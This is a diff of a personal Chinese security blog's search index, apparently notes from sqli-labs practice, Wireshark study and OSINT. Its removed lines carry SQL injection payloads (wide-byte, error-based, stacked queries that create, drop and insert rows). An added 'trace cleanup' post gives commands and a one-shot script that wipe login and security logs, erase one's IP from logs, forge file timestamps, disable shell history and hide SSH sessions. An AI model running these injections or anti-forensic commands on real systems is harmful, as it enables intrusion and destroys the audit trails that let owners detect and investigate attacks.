-<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
-<br>
-
-<br>
-
-<h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
-<p><code>?id=0 union select 1,database(),3</code></p>
-<br>
-
-<br>
-
-<h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
-<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
-<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
-<br>
-
-<h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
-<br>
-
-<h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>mysqli_multi_query()</code>堆叠注入，多个查询用<code>;</code>分隔</p>
-<p>参考<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
-<p><code>?id=1&#39;;create table test like users --+</code></p>
-<p>发现数据库中新建了名的<code>test</code>的表</p>
-<p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
-<p>在<code>uers</code>表添加数据</p>
-<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-<br>
-
-<h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>数字型 不需要闭合</p>
-<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
-<br>
-
-<h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-<br>
-
-<h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
-<p>可以判断是数字型，和39一样</p>
-<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
 ]]></content>
       <categories>
         <category>SQLi</category>
@@ -4367,11 +4367,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>upload-labs1</title>
-    <url>/posts/685229a3/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>sqlmapos-shell使用</title>
     <url>/posts/a92f908a/</url>
     <content><![CDATA[<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>phpstudy + sqlilab 本地测试</p>
@@ -4417,6 +4412,11 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       <tags>
         <tag>sqlmap</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>upload-labs1</title>
+    <url>/posts/685229a3/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>vulnhub-hackme2-DHCP靶机(待完成)</title>
@@ -5169,6 +5169,50 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>wireshark学习-1</title>
+    <url>/posts/6c4c4fdf/</url>
+    <content><![CDATA[<h3 id="wireshark默认显示方式"><a href="#wireshark默认显示方式" class="headerlink" title="wireshark默认显示方式"></a>wireshark默认显示方式</h3><p><img src="/posts/6c4c4fdf/1.png" alt="截图"></p>
+<h3 id="wireshark中-默认的列"><a href="#wireshark中-默认的列" class="headerlink" title="wireshark中 默认的列"></a>wireshark中 默认的列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No. ：捕获的数据帧序号，第一帧始终为 1。</span><br><span class="line">Time ：从捕获的第一帧开始的计算的时间（单位为纳秒），第一帧标记为 0.000000。</span><br><span class="line">Source ：源地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Destination ：目的地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Protocol ：以太网帧、IP数据包、TCP分片所使用的协议（ARP、DNS、TCP、HTTP等）。</span><br><span class="line">Length ：数据帧长度（单位为字节）。</span><br></pre></td></tr></table></figure>
+
+<h4 id="隐藏不需要的列"><a href="#隐藏不需要的列" class="headerlink" title="隐藏不需要的列"></a>隐藏不需要的列</h4><p>可以通过右键标题栏 选择隐藏不需要的列</p>
+<h4 id="删除不需要的列"><a href="#删除不需要的列" class="headerlink" title="删除不需要的列"></a>删除不需要的列</h4><p>如果有些列用不到 可以选择该列后右键 -&gt; Remove This Column 进行删除</p>
+<h4 id="添加需要的列"><a href="#添加需要的列" class="headerlink" title="添加需要的列"></a>添加需要的列</h4><p>右键点击标题栏 选择<code>Column Preferences</code> 点击左下角的 <code>+</code>  列表中将会出现一个标题为New Column的表项。</p>
+<h4 id="修改时间格式"><a href="#修改时间格式" class="headerlink" title="修改时间格式"></a>修改时间格式</h4><p>点击菜单栏的 <code>视图</code> 选择 <code>时间显示格式</code> 可以去选择<code>UTC</code> 秒等</p>
+<h4 id="添加自定义列"><a href="#添加自定义列" class="headerlink" title="添加自定义列"></a>添加自定义列</h4><p>可以选择数据包细节窗口 选择需要添加的数据 右键点击应用为列 即可成功添加</p>
+<hr>
+<p>背景为红色 =&gt; 这个表达式尚未被接受</p>
+<p>背景为绿色 =&gt; 这个表达式可以正常工作</p>
+<p>背景为黄色 =&gt; 这个表达式可以被接受，但是可能不会按预期工作</p>
+<br>
+
+<p>wireshark 显示过滤器   布尔表达式</p>
+<ul>
+<li>等于        ==  或 eq</li>
+<li>且            &amp;&amp; 或 and</li>
+<li>或             ||       或 or</li>
+</ul>
+<br>
+
+<p>eg</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.addr eq 192.168.10.195 and ip.addr &#x3D;&#x3D; 192.168.10.1</span><br><span class="line"></span><br><span class="line">http.request &amp;&amp; ip.addr &#x3D;&#x3D; 192.168.10.195</span><br><span class="line"></span><br><span class="line">http.request || http.response</span><br><span class="line"></span><br><span class="line">dns.qry.name contains microsoft or dns.qry.name contains windows</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>选择排除特定值时 不要在表达式中使用 != </p>
+<p>可以使用<code>!(ip.addr == 192.168.10.1)</code>  而不是使用<code>ip.addr != 192.168.10.1</code></p>
+<br>
+
+<p><code>http.request or ssl.handshake.type == 1</code></p>
+<p><code>http.request</code>  </p>
+<p><code>ssl.handshake.type == 1</code></p>
+<br>
+
+<hr>
+<h3 id="识别主机和用户"><a href="#识别主机和用户" class="headerlink" title="识别主机和用户"></a>识别主机和用户</h3><h4 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h4><br>
+
+<h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4>]]></content>
+  </entry>
+  <entry>
     <title>xss-labs1</title>
     <url>/posts/ca3eea61/</url>
     <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
@@ -5254,50 +5298,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       <tags>
         <tag>XSS</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>wireshark学习-1</title>
-    <url>/posts/6c4c4fdf/</url>
-    <content><![CDATA[<h3 id="wireshark默认显示方式"><a href="#wireshark默认显示方式" class="headerlink" title="wireshark默认显示方式"></a>wireshark默认显示方式</h3><p><img src="/posts/6c4c4fdf/1.png" alt="截图"></p>
-<h3 id="wireshark中-默认的列"><a href="#wireshark中-默认的列" class="headerlink" title="wireshark中 默认的列"></a>wireshark中 默认的列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">No. ：捕获的数据帧序号，第一帧始终为 1。</span><br><span class="line">Time ：从捕获的第一帧开始的计算的时间（单位为纳秒），第一帧标记为 0.000000。</span><br><span class="line">Source ：源地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Destination ：目的地址，通常是 IPv4、IPv6 或者 以太网地址。</span><br><span class="line">Protocol ：以太网帧、IP数据包、TCP分片所使用的协议（ARP、DNS、TCP、HTTP等）。</span><br><span class="line">Length ：数据帧长度（单位为字节）。</span><br></pre></td></tr></table></figure>
-
-<h4 id="隐藏不需要的列"><a href="#隐藏不需要的列" class="headerlink" title="隐藏不需要的列"></a>隐藏不需要的列</h4><p>可以通过右键标题栏 选择隐藏不需要的列</p>
-<h4 id="删除不需要的列"><a href="#删除不需要的列" class="headerlink" title="删除不需要的列"></a>删除不需要的列</h4><p>如果有些列用不到 可以选择该列后右键 -&gt; Remove This Column 进行删除</p>
-<h4 id="添加需要的列"><a href="#添加需要的列" class="headerlink" title="添加需要的列"></a>添加需要的列</h4><p>右键点击标题栏 选择<code>Column Preferences</code> 点击左下角的 <code>+</code>  列表中将会出现一个标题为New Column的表项。</p>
-<h4 id="修改时间格式"><a href="#修改时间格式" class="headerlink" title="修改时间格式"></a>修改时间格式</h4><p>点击菜单栏的 <code>视图</code> 选择 <code>时间显示格式</code> 可以去选择<code>UTC</code> 秒等</p>
-<h4 id="添加自定义列"><a href="#添加自定义列" class="headerlink" title="添加自定义列"></a>添加自定义列</h4><p>可以选择数据包细节窗口 选择需要添加的数据 右键点击应用为列 即可成功添加</p>
-<hr>
-<p>背景为红色 =&gt; 这个表达式尚未被接受</p>
-<p>背景为绿色 =&gt; 这个表达式可以正常工作</p>
-<p>背景为黄色 =&gt; 这个表达式可以被接受，但是可能不会按预期工作</p>
-<br>
-
-<p>wireshark 显示过滤器   布尔表达式</p>
-<ul>
-<li>等于        ==  或 eq</li>
-<li>且            &amp;&amp; 或 and</li>
-<li>或             ||       或 or</li>
-</ul>
-<br>
-
-<p>eg</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.addr eq 192.168.10.195 and ip.addr &#x3D;&#x3D; 192.168.10.1</span><br><span class="line"></span><br><span class="line">http.request &amp;&amp; ip.addr &#x3D;&#x3D; 192.168.10.195</span><br><span class="line"></span><br><span class="line">http.request || http.response</span><br><span class="line"></span><br><span class="line">dns.qry.name contains microsoft or dns.qry.name contains windows</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>选择排除特定值时 不要在表达式中使用 != </p>
-<p>可以使用<code>!(ip.addr == 192.168.10.1)</code>  而不是使用<code>ip.addr != 192.168.10.1</code></p>
-<br>
-
-<p><code>http.request or ssl.handshake.type == 1</code></p>
-<p><code>http.request</code>  </p>
-<p><code>ssl.handshake.type == 1</code></p>
-<br>
-
-<hr>
-<h3 id="识别主机和用户"><a href="#识别主机和用户" class="headerlink" title="识别主机和用户"></a>识别主机和用户</h3><h4 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h4><br>
-
-<h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4>]]></content>
   </entry>
   <entry>
     <title>xss-labs2</title>
@@ -5429,11 +5429,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>zkaq内网靶场2</title>
-    <url>/posts/ae9fec7e/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>个人规划</title>
     <url>/posts/d7c4f825/</url>
     <content><![CDATA[<p>最近一直在考研和就业上有所犹豫，这两天回家呆了几天，仔细想了想，最终还是决定选择就业，不去考研了。在这半年中，要好好准备，等暑假或者开学后去外面实习。在这期间，要好好学习以下一些知识。之前hvv面试了四次，面试前也没再接触这些兑现，再学习高数英语啥的，现在做好决定了，那就认真准备吧~</p>
@@ -5506,6 +5501,11 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>zkaq内网靶场2</title>
+    <url>/posts/ae9fec7e/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>使用proxychains4gitclone拒绝访问</title>
     <url>/posts/3a6e39d4/</url>
     <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
@@ -5515,18 +5515,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集可能会用到的站点</title>
-    <url>/posts/4259031d/</url>
-    <content><![CDATA[<p>国家企业信用信息公示系统 网址：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a><br>香港查册中心网址：<a href="https://www.icris.cr.gov.hk/csci/">https://www.icris.cr.gov.hk/csci/</a><br>台湾商工行政务服务入口网<a href="https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do">https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do</a><br>英国工商信息<a href="https://www.gov.uk/government/organisations/companies-house">https://www.gov.uk/government/organisations/companies-house</a><br>美国工商信息网址：<a href="http://www.wysk.com/index/">http://www.wysk.com/index/</a><br>新加坡工商信息网站：<a href="https://www.acra.gov.sg/home/">https://www.acra.gov.sg/home/</a><br>澳大利亚工商信息网址：<a href="http://abr.business.gov.au/">http://abr.business.gov.au</a><br>印度工商信息 网址：<a href="http://www.mca.gov.in/">http://www.mca.gov.in</a><br>第三方企业查询网站  网址：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>企查查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>爱企查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>启信宝  网址：<a href="https://www.qixin.com/">https://www.qixin.com/</a><br>Opencorporates 网址：<a href="https://opencorporates.com/">https://opencorporates.com/</a> 可查询全球公司基本工商信息。<br>Google  <a href="https://www.google.co.jp/">https://www.google.co.jp/</a><br>百度 网址：<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
-]]></content>
-      <categories>
-        <category>信息收集</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -5579,6 +5567,18 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
 <li>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io</a></li>
 </ul>
 <h2 id="GitHub敏感信息泄漏"><a href="#GitHub敏感信息泄漏" class="headerlink" title="GitHub敏感信息泄漏"></a>GitHub敏感信息泄漏</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a></p>
+]]></content>
+      <categories>
+        <category>信息收集</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集可能会用到的站点</title>
+    <url>/posts/4259031d/</url>
+    <content><![CDATA[<p>国家企业信用信息公示系统 网址：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a><br>香港查册中心网址：<a href="https://www.icris.cr.gov.hk/csci/">https://www.icris.cr.gov.hk/csci/</a><br>台湾商工行政务服务入口网<a href="https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do">https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do</a><br>英国工商信息<a href="https://www.gov.uk/government/organisations/companies-house">https://www.gov.uk/government/organisations/companies-house</a><br>美国工商信息网址：<a href="http://www.wysk.com/index/">http://www.wysk.com/index/</a><br>新加坡工商信息网站：<a href="https://www.acra.gov.sg/home/">https://www.acra.gov.sg/home/</a><br>澳大利亚工商信息网址：<a href="http://abr.business.gov.au/">http://abr.business.gov.au</a><br>印度工商信息 网址：<a href="http://www.mca.gov.in/">http://www.mca.gov.in</a><br>第三方企业查询网站  网址：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>企查查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>爱企查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>启信宝  网址：<a href="https://www.qixin.com/">https://www.qixin.com/</a><br>Opencorporates 网址：<a href="https://opencorporates.com/">https://opencorporates.com/</a> 可查询全球公司基本工商信息。<br>Google  <a href="https://www.google.co.jp/">https://www.google.co.jp/</a><br>百度 网址：<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
 ]]></content>
       <categories>
         <category>信息收集</category>
@@ -6409,6 +6409,23 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>杂</title>
+    <url>/posts/9577635b/</url>
+    <content><![CDATA[<p>9月开始就一直没在更新博客，只把一些学习笔记放在本地了。最近年底了，在公司没(摸)事（🐟）干，就总结下在这边实习学到的些东西、本来打算用wordpress去搭建，搭好之后发现太麻烦了，还是hexo简单，而且之前的东西也不用迁移。之前一直托管到github上，但是有些图片无法成功解析出来，所以就准备放在云主机上，最近这几天就开始把本地的一些东西整理一下放到博客上..o(<em>￣▽￣</em>)ブ</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>权限维持-Linux篇(待完成)</title>
+    <url>/posts/29801cba/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>权限维持</category>
+      </categories>
+      <tags>
+        <tag>权限维持</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>权限维持-Windows篇-01(待完成)</title>
     <url>/posts/709e0d6/</url>
     <content><![CDATA[]]></content>
@@ -6420,25 +6437,8 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>杂</title>
-    <url>/posts/9577635b/</url>
-    <content><![CDATA[<p>9月开始就一直没在更新博客，只把一些学习笔记放在本地了。最近年底了，在公司没(摸)事（🐟）干，就总结下在这边实习学到的些东西、本来打算用wordpress去搭建，搭好之后发现太麻烦了，还是hexo简单，而且之前的东西也不用迁移。之前一直托管到github上，但是有些图片无法成功解析出来，所以就准备放在云主机上，最近这几天就开始把本地的一些东西整理一下放到博客上..o(<em>￣▽￣</em>)ブ</p>
-]]></content>
-  </entry>
-  <entry>
     <title>权限维持-Windows篇-02(待完成)</title>
     <url>/posts/9e00b16c/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>权限维持</category>
-      </categories>
-      <tags>
-        <tag>权限维持</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>权限维持-Linux篇(待完成)</title>
-    <url>/posts/29801cba/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>权限维持</category>
@@ -6496,6 +6496,55 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>SQLi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>痕迹清理-Linux篇</title>
+    <url>/posts/1b08230/</url>
+    <content><![CDATA[<h3 id="登录痕迹清理"><a href="#登录痕迹清理" class="headerlink" title="登录痕迹清理"></a>登录痕迹清理</h3><h4 id="基本的日志结构"><a href="#基本的日志结构" class="headerlink" title="基本的日志结构"></a>基本的日志结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp 记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure 记录与安全相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"># 清除用户最后一次登录时间</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog </span><br><span class="line"># 清除安全日志记录</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># 清除系统日志记录</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># 清除当前登录用户的信息</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;utmp </span><br></pre></td></tr></table></figure>
+
+<h4 id="删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip"><a href="#删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip" class="headerlink" title="删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip"></a>删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</h4><p><code>sed -i &#39;/自己的ip/&#39;d /var/log/messages</code></p>
+<h4 id="全局替换自己ip"><a href="#全局替换自己ip" class="headerlink" title="全局替换自己ip"></a>全局替换自己ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
+<p>前面是待替换ip 后面为替换后的ip</p>
+<h3 id="时间痕迹清理"><a href="#时间痕迹清理" class="headerlink" title="时间痕迹清理"></a>时间痕迹清理</h3><p><code>ls -al</code> 可以查看创建时间</p>
+<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch -r 目标时间的文件 需要修改时间的文件</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ： 仅修改access time</span><br><span class="line">-c ：仅修改时间，而不建立文件</span><br><span class="line">-d ：后面可以接日期，也可以使用 --date&#x3D;&quot;日期或时间&quot;</span><br><span class="line">-m ：仅修改mtime</span><br><span class="line">-t ：后面可以接时间，格式为 [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>
+
+<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> 将当前系统日期修改为2014年07月12 18:30:50</p>
+<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # –hctosys 将系统时钟调整为与目前的硬件时钟一致。</p>
+<h3 id="操作痕迹清理"><a href="#操作痕迹清理" class="headerlink" title="操作痕迹清理"></a>操作痕迹清理</h3><h4 id="服务日志修改"><a href="#服务日志修改" class="headerlink" title="服务日志修改"></a>服务日志修改</h4><p># 使用grep -v来把我们的相关信息删除,</p>
+<p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
+<p># 把修改过的日志覆盖到原日志文件</p>
+<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
+<h4 id="history记录清理"><a href="#history记录清理" class="headerlink" title="history记录清理"></a>history记录清理</h4><ul>
+<li>登录ssh后不记录history</li>
+</ul>
+<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
+<ul>
+<li>清理 <code>~/.bash_history</code></li>
+<li><code>history -c </code></li>
+<li><code>vim /etc/profile</code> 修改 <code>HISTSIZE=0</code></li>
+</ul>
+<h4 id="文件覆写"><a href="#文件覆写" class="headerlink" title="文件覆写"></a>文件覆写</h4><ul>
+<li>单文件</li>
+</ul>
+<p><code>shred -f -u -z -v -n 8 1.txt</code></p>
+<ul>
+<li>文件夹</li>
+</ul>
+<p><code>wipe -r</code></p>
+<h3 id="隐藏ssh登录记录"><a href="#隐藏ssh登录记录" class="headerlink" title="隐藏ssh登录记录"></a>隐藏ssh登录记录</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
+<p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code></p>
+<p><code>-o UserKnownHostsFile=/dev/null</code> #这个是knowhost的信息及公钥</p>
+<p><code>-T user@host /bin/bash –i</code> #不分配伪终端但是给个bash的终端</p>
+<h3 id="一键清除脚本"><a href="#一键清除脚本" class="headerlink" title="一键清除脚本"></a>一键清除脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>痕迹清理</category>
+      </categories>
+      <tags>
+        <tag>痕迹清理</tag>
       </tags>
   </entry>
   <entry>
@@ -6565,55 +6614,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
 
 
 
-]]></content>
-      <categories>
-        <category>痕迹清理</category>
-      </categories>
-      <tags>
-        <tag>痕迹清理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>痕迹清理-Linux篇</title>
-    <url>/posts/1b08230/</url>
